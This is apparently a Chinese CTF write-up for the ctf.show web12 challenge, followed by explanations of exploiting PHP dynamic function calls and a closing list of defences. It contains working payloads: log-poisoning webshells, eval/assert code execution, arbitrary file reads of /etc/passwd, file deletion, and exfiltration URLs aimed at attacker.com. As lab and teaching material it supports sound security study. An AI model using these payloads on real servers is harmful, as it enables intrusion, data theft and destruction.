```html

<html lang="zh-CN">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <meta name="viewport" content="width=device-width  minimum-scale=1.0  maximum-scale=1.0  initial-scale=1.0" />
    <title>ctf.show_web12</title>
</head>
<body>
    <center>
    <h2>ctf.show_web12</h2>
    <h4>where is the flag?</h4>
    <!-- hit:?cmd= -->
    
</body>
</html>


```

查看源代码，发现有提示与cmd有关

nginx日志写shell，然后蚁剑连接利用插件绕过disable_function

1、?cmd=include("/var/log/nginx/access.log"); 拦截包，在UA头内加入php一句话木马

2、蚁剑连接，发现无操作权限，使用插件绕过disable_function，成功查看flag


---

cmd=highlight_file('index.php'); cmd=print_r(glob('*')); cmd=highlight_file('flag')

cmd=eval($_REQUEST['shell']); 蚁剑连接密码为shell

通过F12或者BP拦截发现源码中带有“cmd”，暗示我们利用cmd代码执行漏洞————

先输入?cmd=phpinfo(); 显示出php页面，说明 存在漏洞———— `?cmd=print_r(scandir('./')); ` 显示了两个php文件

然后输入`?cmd=print_r(glob('*'));`遍历目录 glob（）函数用来查找文件，返回一个文件数组————

遍历后发现2个文件 分别输入 发现有一个看不着————

输入`https://1ee776cc-9c49-42f1-804d-93b59348a5c9.challenge.ctf.show/index.php?cmd=highlight_file(%27903c00105c0141fd37ff47697e916e53616e33a72fb3774ab213b3e2a732f56f.php%27);` 打开成功找到flag ———— 不能缺;否则页面不回显
ctfshow{f7e3a426-d27c-47b1-92ff-dc7ea5e00875}

highlight_file()函数，可以使文件内容高亮显示，常用于读取文件


----




          
你提到的 `glob` 绕过和 `highlight` 看源码，是在 PHP 函数执行漏洞场景下非常实用的技巧。它们利用的是 PHP 内部函数的功能，而不是操作系统命令。

假设存在一个 PHP 函数执行漏洞，例如服务器端代码类似于：

```php
<?php
    $func_name = $_GET['cmd'];
    $arg = $_GET['arg']; // 假设可以传入一个参数
    if (function_exists($func_name)) {
        if ($arg) {
            $func_name($arg); // 动态调用 PHP 函数并传入参数
        } else {
            $func_name(); // 动态调用无参数的 PHP 函数
        }
    } else {
        echo "Function not found.";
    }
?>
```

或者更简单，直接将 `cmd` 作为函数名调用：

```php
<?php
    $func_name = $_GET['cmd'];
    if (function_exists($func_name)) {
        $func_name('some_default_arg'); // 假设有一个默认参数
    } else {
        echo "Function not found.";
    }
?>
```

在这种情况下，我们就可以利用 `glob()` 和 `highlight_file()`（或 `show_source()`）这两个 PHP 函数。

### 1. `glob` 绕过 (用于文件/目录列表)

*   **`glob()` 函数的作用**：
    `glob()` 是 PHP 的一个内置函数，它根据指定的模式查找匹配的文件路径。它的行为类似于 Unix shell 中的 `ls` 命令，但它是一个 PHP 函数，因此可以绕过对 `system()`、`exec()` 等系统命令执行函数的限制。

*   **为什么可以用于“绕过”**：
    在很多 CTF 场景中，如果 `system('ls')` 或 `scandir()` 等函数被禁用或过滤，`glob()` 可能会成为一个有效的替代方案，用于列出目录内容，帮助攻击者发现潜在的敏感文件。

*   **如何使用 `glob()` 构造攻击**：
    假设我们可以通过 `?cmd=glob&arg=pattern` 的形式调用 `glob()` 函数。

    *   **列出当前目录下的所有文件和目录**：
        *   **Payload**：`?cmd=glob&arg=*`
        *   **解释**：`*` 是通配符，匹配所有文件和目录名。
        *   **示例输出**：可能会返回一个数组，包含 `index.php`, `flag.txt`, `config.php` 等。

    *   **列出当前目录下所有 `.php` 文件**：
        *   **Payload**：`?cmd=glob&arg=*.php`
        *   **解释**：`*.php` 匹配所有以 `.php` 结尾的文件。

    *   **列出当前目录下以 `flag` 开头的文件**：
        *   **Payload**：`?cmd=glob&arg=flag*`
        *   **解释**：`flag*` 匹配所有以 `flag` 开头的文件。

    *   **列出上级目录的文件**：
        *   **Payload**：`?cmd=glob&arg=../*`
        *   **解释**：`../` 表示上级目录。

*   **`glob()` 的优劣**：
    *   **优点**：
        *   **绕过限制**：可以绕过对 `system()`、`exec()`、`scandir()` 等函数的禁用或过滤。
        *   **文件发现**：在不知道确切文件名时，可以通过通配符模式发现潜在的敏感文件。
        *   **PHP 内置**：作为 PHP 函数，它在 PHP 环境中执行，通常比执行外部系统命令更稳定。
    *   **缺点**：
        *   **无法读取内容**：`glob()` 只能列出文件路径，不能直接读取文件内容。需要结合其他函数（如 `highlight_file()` 或 `file_get_contents()`）来读取。
        *   **输出格式**：通常返回一个数组，可能需要进一步处理才能在页面上清晰显示。
        *   **仍然可能被禁用**：`glob()` 本身也可能被管理员通过 `disable_functions` 禁用。

### 2. `highlight` 看源码 (使用 `highlight_file()` 或 `show_source()`)

*   **`highlight_file()` / `show_source()` 函数的作用**：
    这两个函数是 PHP 的别名，它们的作用是输出指定文件的语法高亮源代码。这对于审计代码、发现漏洞或获取敏感信息（如数据库凭据、API 密钥）至关重要。

*   **如何使用 `highlight_file()` 构造攻击**：
    假设我们可以通过 `?cmd=highlight_file&arg=filename` 的形式调用 `highlight_file()` 函数。

    *   **查看当前页面的源代码**：
        *   **Payload**：`?cmd=highlight_file&arg=index.php` (假设当前页面是 `index.php`)
        *   **解释**：直接输出 `index.php` 的源代码，并进行语法高亮。

    *   **查看其他 PHP 文件的源代码**：
        *   **Payload**：`?cmd=highlight_file&arg=config.php` (假设存在一个 `config.php` 文件)
        *   **解释**：`config.php` 通常包含数据库连接信息、密钥等敏感数据。

    *   **查看系统敏感文件（如果可读）**：
        *   **Payload**：`?cmd=highlight_file&arg=/etc/passwd`
        *   **解释**：尝试读取 `/etc/passwd` 文件，获取系统用户信息。

*   **`highlight_file()` 的优劣**：
    *   **优点**：
        *   **直接获取源码**：能够直接获取到文件的源代码，这是进行下一步攻击（如代码审计、寻找漏洞、发现敏感信息）的关键。
        *   **语法高亮**：输出的源代码带有语法高亮，可读性强，方便分析。
        *   **PHP 内置**：作为 PHP 函数，它在 PHP 环境中执行。
    *   **缺点**：
        *   **只读不写**：只能读取文件内容，不能修改或执行文件。
        *   **权限限制**：只能读取 Web 服务器用户有权限访问的文件。
        *   **仍然可能被禁用**：`highlight_file()` 和 `show_source()` 也可能被管理员禁用。

### 综合利用策略

在实际的 CTF 挑战中，你通常会结合使用这些技巧：

1.  **信息收集**：首先尝试使用 `glob()` 来列出目录内容，发现可疑的文件名（如 `flag.php`、`config.php`、`secret.txt` 等）。
    *   **Payload**：`?cmd=glob&arg=*`
    *   **Payload**：`?cmd=glob&arg=*.php`
    *   **Payload**：`?cmd=glob&arg=flag*`

2.  **源码审计**：一旦发现可疑的 PHP 文件，立即使用 `highlight_file()` 来查看其源代码，寻找 `flag`、数据库凭据、其他漏洞点或进一步的线索。
    *   **Payload**：`?cmd=highlight_file&arg=index.php`
    *   **Payload**：`?cmd=highlight_file&arg=config.php`
    *   **Payload**：`?cmd=highlight_file&arg=flag.php` (如果 `glob` 找到了这个文件)

通过这种组合拳，你可以在没有直接命令执行权限的情况下，逐步获取服务器上的敏感信息，最终找到 `flag`。

----


          
你提出的问题非常棒，它触及了 Web 安全中一个重要的概念区分：**操作系统命令执行**和**PHP 函数执行**。

在之前的讨论中，`<!-- hit:?cmd= -->` 这个提示通常指向的是**命令注入（Command Injection）**，即应用程序将用户输入作为**操作系统命令**来执行，例如 `system($_GET['cmd'])`。在这种情况下，我们尝试执行的是 `ls`、`cat` 等 Shell 命令。

然而，如果服务器端的 PHP 代码不是将 `cmd` 参数作为操作系统命令执行，而是将其作为**PHP 函数名**来动态调用，那么情况就完全不同了。例如，代码可能长这样：

```php
<?php
    $func_name = $_GET['cmd'];
    if (function_exists($func_name)) {
        $func_name(); // 动态调用 PHP 函数
    } else {
        echo "Function not found.";
    }
?>
```

或者更复杂一点，带有参数：

```php
<?php
    $func_name = $_GET['cmd'];
    $arg = $_GET['arg'];
    if (function_exists($func_name)) {
        $func_name($arg); // 动态调用 PHP 函数并传入参数
    } else {
        echo "Function not found.";
    }
?>
```

在这种情况下，我们就可以利用 PHP 内部的函数来构造攻击。下面我将列举一些常见的可被利用的 PHP 内部函数及其攻击场景、优劣。

### 可被利用的 PHP 内部函数及攻击场景

#### 1. 任意代码执行 (Arbitrary Code Execution)

这类函数允许攻击者直接在服务器上执行任意 PHP 代码，是危害最大的漏洞类型之一。

*   **`eval()`**
    *   **作用**：将字符串作为 PHP 代码执行。
    *   **利用方式**：如果 `cmd` 参数被直接 `eval`，或者被用于构造 `eval` 的字符串，攻击者可以注入任意 PHP 代码。
    *   **Payload 示例**：`?cmd=eval&arg=phpinfo();` (如果代码是 `$_GET['cmd']($_GET['arg'])`) 或 `?cmd=phpinfo();` (如果代码是 `eval($_GET['cmd'])`)
    *   **优劣**：
        *   **优点**：直接、强大，可以执行任何 PHP 代码，获取服务器信息、写入 Shell 等。
        *   **缺点**：通常需要非常宽松的过滤，或者特定的代码结构才能利用。
    *   **场景**：当应用程序需要动态执行用户提供的代码片段时（极少见且非常危险）。

*   **`assert()`**
    *   **作用**：检查一个断言是否为 `false`。在某些 PHP 版本和配置下，如果断言是一个字符串，它会像 `eval()` 一样执行该字符串。
    *   **利用方式**：与 `eval()` 类似，注入 PHP 代码字符串。
    *   **Payload 示例**：`?cmd=assert&arg=phpinfo();`
    *   **优劣**：
        *   **优点**：与 `eval()` 类似，可以执行任意 PHP 代码。
        *   **缺点**：在 PHP 7.x 之后，`assert()` 默认不再执行字符串，需要 `zend.assertions=1` 和 `assert.exception=0` 配置。
    *   **场景**：旧版本 PHP 或特定配置下的代码审计。

*   **`create_function()`**
    *   **作用**：创建一个匿名函数。其函数体可以由字符串指定。
    *   **利用方式**：如果攻击者能控制 `create_function()` 的第二个参数（函数体），就可以注入任意 PHP 代码。
    *   **Payload 示例**：通常需要更复杂的构造，例如 `?cmd=create_function&arg=,phpinfo();` (如果代码是 `create_function('', $_GET['arg'])`)
    *   **优劣**：
        *   **优点**：可以绕过一些对 `eval` 的直接检测。
        *   **缺点**：利用相对复杂，且在 PHP 7.2.0 中已废弃。
    *   **场景**：旧版本 PHP 中动态创建回调函数。

*   **`preg_replace()` (带 `/e` 修饰符)**
    *   **作用**：执行正则表达式替换。当使用 `/e` 修饰符时，替换字符串会被当作 PHP 代码执行。
    *   **利用方式**：如果攻击者能控制 `preg_replace()` 的模式或替换字符串，并存在 `/e` 修饰符，即可注入代码。
    *   **Payload 示例**：通常需要控制模式和替换字符串，例如 `?cmd=preg_replace&pattern=/test/e&replacement=phpinfo();`
    *   **优劣**：
        *   **优点**：隐蔽性较好，可以绕过一些简单的代码检测。
        *   **缺点**：`/e` 修饰符在 PHP 5.5.0 中已废弃，在 PHP 7.0.0 中被移除。
    *   **场景**：旧版本 PHP 中处理字符串替换。

*   **`unserialize()` (反序列化漏洞)**
    *   **作用**：将一个序列化的 PHP 对象或数据结构恢复为 PHP 变量。
    *   **利用方式**：如果应用程序对用户可控的数据进行 `unserialize()` 操作，攻击者可以构造恶意的序列化字符串，利用 PHP 对象的“魔术方法”（如 `__wakeup()`, `__destruct()`, `__toString()` 等）和“Gadget Chains”来触发任意代码执行。
    *   **Payload 示例**：通常是一个非常长的序列化字符串，例如 `?cmd=unserialize&arg=O:4:"User":1:{s:8:"username";s:16:"<?php phpinfo();?>";}` (这只是一个概念性示例，实际利用需要根据目标代码的类结构构造 Gadget Chain)。
    *   **优劣**：
        *   **优点**：非常强大，可以绕过很多过滤，实现复杂攻击。
        *   **缺点**：利用难度高，需要了解目标应用程序的类结构和可利用的魔术方法。
    *   **场景**：当应用程序使用 `serialize()` 和 `unserialize()` 来存储和恢复对象时，例如会话管理、缓存、数据传输等。

#### 2. 文件操作 (File Operations)

这类函数允许攻击者读取、写入、删除文件，是获取敏感信息或上传 Webshell 的关键。

*   **`file_get_contents()` / `readfile()`**
    *   **作用**：读取文件内容。
    *   **利用方式**：如果攻击者能控制文件路径参数，可以读取服务器上的任意文件。
    *   **Payload 示例**：`?cmd=file_get_contents&arg=/etc/passwd` 或 `?cmd=readfile&arg=/var/www/html/config.php`
    *   **优劣**：
        *   **优点**：直接获取文件内容，常用于信息泄露。
        *   **缺点**：只能读取文件，不能写入或执行。
    *   **场景**：文件读取、配置信息泄露。

*   **`file_put_contents()`**
    *   **作用**：将字符串写入文件。
    *   **利用方式**：如果攻击者能控制文件路径和写入内容，可以上传 Webshell 或修改现有文件。
    *   **Payload 示例**：`?cmd=file_put_contents&arg=shell.php,<?php eval($_POST[1]);?>` (需要两个参数，一个文件名，一个文件内容，具体取决于代码如何处理参数)
    *   **优劣**：
        *   **优点**：可以直接写入文件，是上传 Webshell 的重要手段。
        *   **缺点**：需要控制两个参数，且可能受到文件权限限制。
    *   **场景**：上传 Webshell、修改配置文件。

*   **`unlink()` / `rmdir()`**
    *   **作用**：删除文件或目录。
    *   **利用方式**：如果攻击者能控制文件/目录路径，可以删除关键文件或清空目录。
    *   **Payload 示例**：`?cmd=unlink&arg=/var/www/html/index.php`
    *   **优劣**：
        *   **优点**：可以破坏网站功能或删除日志等。
        *   **缺点**：通常不是获取 `flag` 的直接手段，更多用于破坏。
    *   **场景**：破坏性攻击、清理痕迹。

*   **`scandir()` / `glob()`**
    *   **作用**：列出目录中的文件和目录。
    *   **利用方式**：如果攻击者能控制目录路径，可以探测服务器的文件结构。
    *   **Payload 示例**：`?cmd=scandir&arg=.` (列出当前目录) 或 `?cmd=scandir&arg=/` (列出根目录)
    *   **优劣**：
        *   **优点**：信息收集，帮助发现 `flag` 文件路径。
        *   **缺点**：只能列出，不能读取内容。
    *   **场景**：文件结构探测、寻找敏感文件。

*   **`include()` / `require()` (文件包含漏洞)**
    *   **作用**：包含并执行指定的 PHP 文件。
    *   **利用方式**：如果攻击者能控制文件路径参数，可以包含任意文件。结合 PHP 伪协议（如 `php://filter`、`data://`）可以读取源码或执行代码。
    *   **Payload 示例**：
        *   读取源码：`?cmd=include&arg=php://filter/read=convert.base64-encode/resource=index.php`
        *   执行代码：`?cmd=include&arg=data://text/plain,<?php phpinfo();?>`
    *   **优劣**：
        *   **优点**：非常强大，可以读取文件、执行代码，是常见的 Web 漏洞。
        *   **缺点**：需要应用程序使用 `include` 或 `require` 且文件路径可控。
    *   **场景**：读取敏感文件、执行任意代码。

#### 3. 信息泄露 (Information Disclosure)

这类函数可以帮助攻击者获取服务器的配置信息、环境变量、PHP 版本等，为后续攻击提供线索。

*   **`phpinfo()`**
    *   **作用**：输出 PHP 的配置信息。
    *   **利用方式**：直接调用即可。
    *   **Payload 示例**：`?cmd=phpinfo` 或 `?cmd=phpinfo()` (取决于代码如何调用)
    *   **优劣**：
        *   **优点**：提供大量有用的信息，如 PHP 版本、禁用函数、环境变量、加载的模块等。
        *   **缺点**：只能泄露信息，不能直接执行代码或文件操作。
    *   **场景**：信息收集、判断服务器环境。

*   **`var_dump()` / `print_r()` / `get_defined_vars()`**
    *   **作用**：打印变量的详细信息。
    *   **利用方式**：如果能控制这些函数的参数，可以打印出服务器端变量的值，包括敏感数据。
    *   **Payload 示例**：`?cmd=var_dump&arg=$_SERVER` (打印 `$_SERVER` 变量) 或 `?cmd=get_defined_vars` (打印所有已定义变量)
    *   **优劣**：
        *   **优点**：可以泄露程序运行时的变量值，帮助理解程序逻辑。
        *   **缺点**：需要猜测或知道哪些变量可能包含敏感信息。
    *   **场景**：调试信息泄露、寻找敏感变量。

#### 4. 网络请求 (Network Requests)

这类函数可以使服务器向外部发起请求，常用于 SSRF (Server-Side Request Forgery) 攻击。

*   **`file_get_contents()` (带 URL 封装器)**
    *   **作用**：除了读取本地文件，还可以通过 URL 封装器（如 `http://`, `ftp://`）读取远程资源。
    *   **利用方式**：如果攻击者能控制 URL 参数，可以使服务器向任意内部或外部地址发起请求。
    *   **Payload 示例**：`?cmd=file_get_contents&arg=http://127.0.0.1/admin` (探测内网服务) 或 `?cmd=file_get_contents&arg=http://attacker.com/log?data=` (数据外带)
    *   **优劣**：
        *   **优点**：可以探测内网、绕过防火墙、进行数据外带。
        *   **缺点**：通常只能发起 GET 请求，且响应可能被过滤。
    *   **场景**：SSRF、内网探测、数据外带。

*   **`curl_exec()`**
    *   **作用**：执行 cURL 会话，可以发送各种 HTTP 请求。
    *   **利用方式**：如果攻击者能控制 cURL 的选项和 URL，可以发起更复杂的网络请求，包括 POST 请求、自定义请求头等。
    *   **Payload 示例**：通常需要更复杂的构造，例如 `?cmd=curl_exec&url=http://attacker.com/post_data&data=secret`
    *   **优劣**：
        *   **优点**：功能强大，支持多种协议和请求方式。
        *   **缺点**：利用相对复杂，需要控制多个参数。
    *   **场景**：SSRF、数据外带、与外部服务交互。

### 总结

当 `cmd` 参数被用于动态调用 PHP 函数时，攻击者可以利用上述函数来达到不同的攻击目的。在实际的 CTF 挑战中，你需要根据页面的提示、错误信息以及对 PHP 代码的猜测，来判断 `cmd` 参数究竟是被当作操作系统命令执行，还是被当作 PHP 函数名来调用，然后选择最合适的攻击方法。

**防御措施**：

*   **避免动态调用用户可控的函数名**：这是最根本的防御。
*   **使用白名单机制**：如果确实需要动态调用函数，只允许调用预定义的安全函数列表。
*   **禁用危险函数**：在 `php.ini` 中通过 `disable_functions` 禁用 `eval`、`system`、`exec` 等高风险函数。
*   **严格的输入验证和过滤**：对所有用户输入进行严格的验证、过滤和净化，确保其符合预期格式和内容。
        